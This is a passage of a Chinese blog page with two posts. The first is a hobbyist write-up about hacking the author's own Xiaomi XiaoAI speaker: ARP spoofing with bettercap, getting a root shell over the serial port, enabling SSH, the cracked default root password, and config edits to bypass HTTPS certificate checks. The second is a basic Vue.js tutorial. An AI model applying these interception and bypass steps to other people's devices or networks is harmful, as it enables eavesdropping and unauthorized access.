                <a class="post-title-link" href="/2020/06/11/对小爱音箱的初步探索/" itemprop="url">对小爱音箱的初步探索（一）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-11T00:40:30+08:00">
                2020-06-11
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/杂类/" itemprop="url" rel="index">
                    <span itemprop="name">杂类</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>##0x01使用bettercap进行中间人劫持<br>小爱音箱和我在同一个wifi下，最简单的方式就是通过arp攻击加上流量重定向到代理上进行匿名代理拦截，大致掩饰一下bettercap的流程：<br><img src="https://i.loli.net/2020/06/05/1NYhUfwRKPHx5sG.jpg" alt><br>这个环境下，我的mbp和小爱处于一个wifi下，小爱的地址是192.168.23.145，我开启arp攻击欺骗小爱，然后启用anyproxy功能将小爱的80流量引导到我的mbp上的burp端口10001。<br>另外burp这边的proxy上要勾选这个选项<br><img src="https://i.loli.net/2020/06/05/JjVUPszBdNq839g.jpg" alt><br>攻击成功后，我就能在burp上抓到小爱的80流量了。</p>
<p>##0x02通过串口方式打开ssh<br>很无奈，小爱绝大部分都是https流量，我用上面同样的方式引导443到10001上，抓不到https，burp直接报证书校验错误。可见小爱大部分流量都是https并且校验证书。<br>为了获得更大的权限我现在只能将小爱敲开，然后通过串口进入他的身体后开启ssh：<br><img src="https://i.loli.net/2020/06/05/jbJ4PtxE2al3UQg.jpg" alt="IMG_6879"><br><img src="https://i.loli.net/2020/06/05/HWJgbTMtNUKOwCS.jpg" alt="IMG_6882-20200602-211727-"><br><img src="https://i.loli.net/2020/06/05/6gBn2xUQ5IRfZPv.jpg" alt="C0645BF3-7E09-43F4-B6F8-6E99F0A2AD98"><br>找到了串口后焊上排针<br><img src="https://i.loli.net/2020/06/05/9i5lyogVmCbrBOU.jpg" alt="IMG_6884"><br>插上杜邦线后连出来，这里我直接把他连出来方便以后用<br><img src="https://i.loli.net/2020/06/05/2vIJYg8OEXu5bRs.jpg" alt="IMG_6890"><br>通过usb转串口连上，putty设置成串口115200波特率，就能看到输出了：<br><img src="https://i.loli.net/2020/06/05/qId72PbojtGrTlQ.jpg" alt="IMG_6888"><br>可以看到，小爱其实是个LEDE的路由器（现在叫openwrt）</p>
<p>##0x03获取root后分析小爱的相关情况<br>首先我要做的是开启ssh：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm /etc/dropbear/*</span><br><span class="line">dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key</span><br><span class="line">dropbear -r /etc/dropbear/dropbear_rsa_host_key</span><br></pre></td></tr></table></figure></p>
<p>其中dropbear是嵌入式设备中爱用的一个ssh服务，执行完毕以上三句后试试是否可以SSH连接了，网上说root密码是空，然而并不是，我也懒得改密码直接打开/etc/shadow里抄出来放到cmd5里解密，这条记录是收费的。<br>解密得到密码：moer123456<br>至此就可以连接了。</p>
<p>随后我们ps一下看一下：<br><img src="https://i.loli.net/2020/06/05/1V3U9rIXngR2a8K.jpg" alt="IMG_6891-20200603-074007-"><br>可以看到一些mi带头的服务，那些基本就是小米的服务，还有一些其他的大部分也是。</p>
<p>接下来看一下开机脚本init.d中的内容，东西挺多的我也不举例了，这里我改了开机脚本里miio的选项，打开了debug日志：<br><img src="https://i.loli.net/2020/06/05/lUPmjOptrd6nhbo.jpg" alt="A415D81C-A6FD-475E-A30F-DC6A85190821"><br>然后重启一下好了（即便你说只需要重启应用就行，但是我就喜欢reboot）<br>重启完后tail一下/tmp/log/miio.log<br><img src="https://i.loli.net/2020/06/05/WrSYbetKg2a4n68.jpg" alt><br>就能看到很多有趣的东西了，有时候即使抓不到包，这个debug日志里也会打印部分请求体。</p>
<p>##0x04尝试通过修改配置文件饶过https证书校验<br>目前看来总共有三块https要绕过：</p>
<p>####1. /usr/share/mico/messaging/messaging.conf 包含了初始化的一些接口<br>大概展示一下配置文件：<br><img src="https://i.loli.net/2020/06/05/PHxygOQ8idF1EVb.jpg" alt><br>通过替换里面的https为http(上图是已经替换了的)，可以绕过部分接口的https问题，并且看下来http也是支持的可以不用强制转为https。</p>
<p>####2. /usr/share/mico/messaging/mediaplayer.cfg 包含了另一些接口，同时有信任的CA证书路径<br>对于该文件有两种思路，一种是替换里面的https为http，另一种是将ca证书路径更改为burp的证书路径。我试试看第二种看看行不行，即指改动certs文件夹的路径，更改后的文件夹是我自己建的，里面放的是burp的ca证书<br><img src="https://i.loli.net/2020/06/05/EIpB72nNbCHx1ol.jpg" alt><br>后面我放弃了改ca路径，还是回到https替换成http的思路上来了。</p>
<p>####3. 替换pub文件<br>/usr/share/mico/messaging/messaging.conf 有记录了一个pub文件，猜测是校验特定接口的公钥时候用的，目前看来可能是*.ai.xiaomi.com这个地址的pub文件<br><img src="https://i.loli.net/2020/06/04/oBfWEXkPdCuScDL.jpg" alt><br>绕过思路是通过burp的ca生成一个pub来替换。 </p>
<p>先从burp中导出私钥<br><img src="https://i.loli.net/2020/06/04/KB2HjJuodtRX3OP.jpg" alt><br>通过命令<code>openssl rsa -inform DER -in priburp -pubout -out burp.pub</code><br>生成公钥文件，然后上传到小爱上去替换掉原来的server_2.pub文件<br><img src="https://i.loli.net/2020/06/05/Tj3MQCuJs87DobO.jpg" alt><br>修改配置文件中的pub文件配置为burp.pub<br><img src="https://i.loli.net/2020/06/05/YQrDsIkZnmh2Wu4.jpg" alt></p>
<p>####4. 重启一下，见证奇迹<br>三个操作都做完了，我们重启后分别观察是否正常………………OK，并不行，主要是第三个pub文件替换没有效果，看起来那个account-dcm.ai.xiaomi.com地址的https并不受这几个pub文件控制（至少我把我能看到的pub文件都替换了）。<br>OK换个思路，我直接去找包含这个域名的文件，结果如下：<br><img src="https://i.loli.net/2020/06/05/Xfzy5WjQOKGi3Pd.jpg" alt><br>既然找到了这个so，我直接修改这个so里的https到http试一下吧，为了以防万一我先备份一个，然后直接vim修改so里的https为http，结果保存一下再重启………………<br>好吧没什么用，看日志似乎直接报错了，估计得放弃部分接口的https了（这一个so后面得再研究一下）</p>
<p>####5. 认栽，还原so和pub文件<br>还原so和pub文件，为了让https通过，我们将信任证书路径的操作也还原，统一该用https替换http的方式来抓取部分接口先做测试吧。最终结果如下：<br><img src="https://i.loli.net/2020/06/05/tx37QjOcKEAClfq.jpg" alt></p>
<p>####6. 一些问题<br>虽然已经是可以抓到部分接口的包了，但是一开始我们将这些接口替换成http后，部分接口会出现403错误，这个时候我们需要将他们再重新定向到443端口：<br><img src="https://i.loli.net/2020/06/05/9eLWqY1holSUCma.jpg" alt><br>这样那些443的接口就会正常了，但是这又会导致部分原本就是http的接口出现没有响应，因为他们也被强制定向到443了。这个问题手工到时候再解决一下。</p>
<p>##0x05 总结<br>暂时先到这里，针对抓包而言，arp欺骗到代理，基本上是什么都能抓的，唯一比较麻烦的是https的证书校验。抛开https，其他的tcp、udp其实也是可以这样直接劫持修改的。<br>后面我会继续没事折腾一下小爱，还是挺好玩的，这次分享的话就先在这里结束掉吧。</p>
<p>PS：如果有人因为看了这个而去抓包怼小爱接口找到了万把块钱的漏洞，希望能请我喝杯瑞幸咖啡。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/12/vue的学习（下）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JOJO">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/touxiang.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="少女的泪">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/12/vue的学习（下）/" itemprop="url">vue的学习（下）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-12T10:43:37+08:00">
                2020-04-12
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/javascript/" itemprop="url" rel="index">
                    <span itemprop="name">javascript</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-表单"><a href="#0x00-表单" class="headerlink" title="0x00 表单"></a>0x00 表单</h2><p>直接看这个里面的示例吧<a href="https://www.runoob.com/vue2/vue-forms.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vue-forms.html</a></p>
<h2 id="0x01-组件"><a href="#0x01-组件" class="headerlink" title="0x01 组件"></a>0x01 组件</h2><h3 id="全局组件"><a href="#全局组件" class="headerlink" title="全局组件"></a>全局组件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">runoob</span>&gt;</span><span class="tag">&lt;/<span class="name">runoob</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">// 注册</span></span><br><span class="line"><span class="undefined">Vue.component('runoob', &#123;</span></span><br><span class="line"><span class="xml">  template: '<span class="tag">&lt;<span class="name">h1</span>&gt;</span>自定义组件!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>'</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">// 创建根实例</span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app'</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="局部组件"><a href="#局部组件" class="headerlink" title="局部组件"></a>局部组件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">runoob</span>&gt;</span><span class="tag">&lt;/<span class="name">runoob</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var Child = &#123;</span></span><br><span class="line"><span class="xml">  template: '<span class="tag">&lt;<span class="name">h1</span>&gt;</span>自定义组件!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>'</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined">// 创建根实例</span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  components: &#123;</span></span><br><span class="line"><span class="xml">    // <span class="tag">&lt;<span class="name">runoob</span>&gt;</span> 将只在父模板可用</span></span><br><span class="line"><span class="undefined">    'runoob': Child</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="prop：父组件向子组件传递信息"><a href="#prop：父组件向子组件传递信息" class="headerlink" title="prop：父组件向子组件传递信息"></a>prop：父组件向子组件传递信息</h3><p>Prop可以理解为组件设定的某个“属性”，父组件通过设置组件的这个属性来动态传递参数<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"parentMsg"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">child</span> <span class="attr">v-bind:message</span>=<span class="string">"parentMsg"</span>&gt;</span><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">// 注册</span></span><br><span class="line"><span class="undefined">Vue.component('child', &#123;</span></span><br><span class="line"><span class="undefined">  // 声明 props</span></span><br><span class="line"><span class="undefined">  props: ['message'],</span></span><br><span class="line"><span class="undefined">  // 同样也可以在 vm 实例中像 "this.message" 这样使用</span></span><br><span class="line"><span class="xml">  template: '<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>'</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">// 创建根实例</span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    parentMsg: '父组件内容'</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="prop验证参数"><a href="#prop验证参数" class="headerlink" title="prop验证参数"></a>prop验证参数</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">Vue.component('my-component', &#123;</span></span><br><span class="line"><span class="undefined">  props: &#123;</span></span><br><span class="line"><span class="undefined">    // 基础的类型检查 (`null` 和 `undefined` 会通过任何类型验证)</span></span><br><span class="line"><span class="undefined">    propA: Number,</span></span><br><span class="line"><span class="undefined">    // 多个可能的类型</span></span><br><span class="line"><span class="undefined">    propB: [String, Number],</span></span><br><span class="line"><span class="undefined">    // 必填的字符串</span></span><br><span class="line"><span class="undefined">    propC: &#123;</span></span><br><span class="line"><span class="undefined">      type: String,</span></span><br><span class="line"><span class="undefined">      required: true</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    // 带有默认值的数字</span></span><br><span class="line"><span class="undefined">    propD: &#123;</span></span><br><span class="line"><span class="undefined">      type: Number,</span></span><br><span class="line"><span class="undefined">      default: 100</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    // 带有默认值的对象</span></span><br><span class="line"><span class="undefined">    propE: &#123;</span></span><br><span class="line"><span class="undefined">      type: Object,</span></span><br><span class="line"><span class="undefined">      // 对象或数组默认值必须从一个工厂函数获取</span></span><br><span class="line"><span class="undefined">      default: function () &#123;</span></span><br><span class="line"><span class="undefined">        return &#123; message: 'hello' &#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    // 自定义验证函数</span></span><br><span class="line"><span class="undefined">    propF: &#123;</span></span><br><span class="line"><span class="undefined">      validator: function (value) &#123;</span></span><br><span class="line"><span class="undefined">        // 这个值必须匹配下列字符串中的一个</span></span><br><span class="line"><span class="undefined">        return ['success', 'warning', 'danger'].indexOf(value) !== -1</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="自定义事件：子组件向父组件传递信息"><a href="#自定义事件：子组件向父组件传递信息" class="headerlink" title="自定义事件：子组件向父组件传递信息"></a>自定义事件：子组件向父组件传递信息</h3><p>子组件需要向父组件传递一些信息的时候，可以通过事件触发的形式，父组件通过v-on来监听特定事件，监听的时候是可以传递参数的.<br>①由于父组件需要参数，所以在父组件中的标签上定义自定义事件，在事件内部获取参数；『@myEvent=” callback”在callback函数中接收参数』<br>②在子组件中触发自定义事件，并传参。『this.$ emit(‘父组件中的自定义事件’,参数)』</p>
<h3 id="组件间通信"><a href="#组件间通信" class="headerlink" title="组件间通信"></a>组件间通信</h3><p>非父子组件间一般通过新建一个空的vue实例，来作为中间件进行通信：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app12"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">my-component12</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component12</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var bus = new Vue();//建立空的bus实例</span></span><br><span class="line"><span class="undefined">Vue.component('my-component12',&#123;</span></span><br><span class="line"><span class="xml">	template: '<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"updateMessage"</span>&gt;</span>传递事件信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span>',</span></span><br><span class="line"><span class="undefined">	methods: &#123;</span></span><br><span class="line"><span class="undefined">	updateMessage: function()&#123;</span></span><br><span class="line"><span class="undefined">	bus.$emit('updateMessage','更新我的组件信息'); //利用中介bus传播事件</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined">var app12 = new Vue(&#123;</span></span><br><span class="line"><span class="undefined">	el: '#app12',</span></span><br><span class="line"><span class="undefined">	data:&#123;</span></span><br><span class="line"><span class="undefined">	message: ''</span></span><br><span class="line"><span class="undefined">	&#125;,</span></span><br><span class="line"><span class="undefined">mounted: function()&#123;</span></span><br><span class="line"><span class="undefined">	var _this = this; //这一步赋值必须有</span></span><br><span class="line"><span class="undefined">	bus.$on('updateMessage',function(data)&#123; //利用中介bus接收事件</span></span><br><span class="line"><span class="undefined">	_this.message = data;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="组件的data"><a href="#组件的data" class="headerlink" title="组件的data"></a>组件的data</h3><p>关于组件里的data属性，一般建议要写成函数形式，避免多个组件实例里相互影响，如果是常数的话可以不用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:function()&#123;</span><br><span class="line">return &#123;</span><br><span class="line">xxx:111</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x02-自定义指令"><a href="#0x02-自定义指令" class="headerlink" title="0x02 自定义指令"></a>0x02 自定义指令</h2><p>简单的示例：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>页面载入时，input 元素自动获取焦点：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-focus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">// 注册一个全局自定义指令 v-focus</span></span><br><span class="line"><span class="undefined">Vue.directive('focus', &#123;</span></span><br><span class="line"><span class="undefined">  // 当绑定元素插入到 DOM 中。</span></span><br><span class="line"><span class="undefined">  inserted: function (el) &#123;</span></span><br><span class="line"><span class="undefined">    // 聚焦元素</span></span><br><span class="line"><span class="undefined">    el.focus()</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">// 创建根实例</span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app'</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这是全局的，类似的，在实例里通过directives属性可以设置一个局部的<br>更多可以看：<a href="https://www.runoob.com/vue2/vue-custom-directive.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vue-custom-directive.html</a><br>感觉不会常用</p>
<h2 id="0x03-路由（重要）"><a href="#0x03-路由（重要）" class="headerlink" title="0x03 路由（重要）"></a>0x03 路由（重要）</h2><p><a href="https://www.runoob.com/vue2/vue-routing.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vue-routing.html</a></p>
<h2 id="0x04-ajax（axios）"><a href="#0x04-ajax（axios）" class="headerlink" title="0x04 ajax（axios）"></a>0x04 ajax（axios）</h2><p>Vue2.0推荐axios，<a href="https://www.runoob.com/vue2/vuejs-ajax-axios.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vuejs-ajax-axios.html</a></p>
<h3 id="GET和POST实例"><a href="#GET和POST实例" class="headerlink" title="GET和POST实例"></a>GET和POST实例</h3><p>都一样的GET换成POST就好了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>网站列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">    <span class="attr">v-for</span>=<span class="string">"site in info"</span></span></span><br><span class="line"><span class="tag">  &gt;</span></span><br><span class="line">    &#123;&#123; site.name &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data () &#123;</span></span><br><span class="line"><span class="undefined">    return &#123;</span></span><br><span class="line"><span class="undefined">      info: null</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  mounted () &#123;</span></span><br><span class="line"><span class="undefined">    axios</span></span><br><span class="line"><span class="undefined">      .get('https://www.runoob.com/try/ajax/json_demo.json')</span></span><br><span class="line"><span class="undefined">      .then(response =&gt; (this.info = response.data.sites))</span></span><br><span class="line"><span class="undefined">      .catch(function (error) &#123; // 请求失败处理</span></span><br><span class="line"><span class="undefined">        console.log(error);</span></span><br><span class="line"><span class="undefined">      &#125;);</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
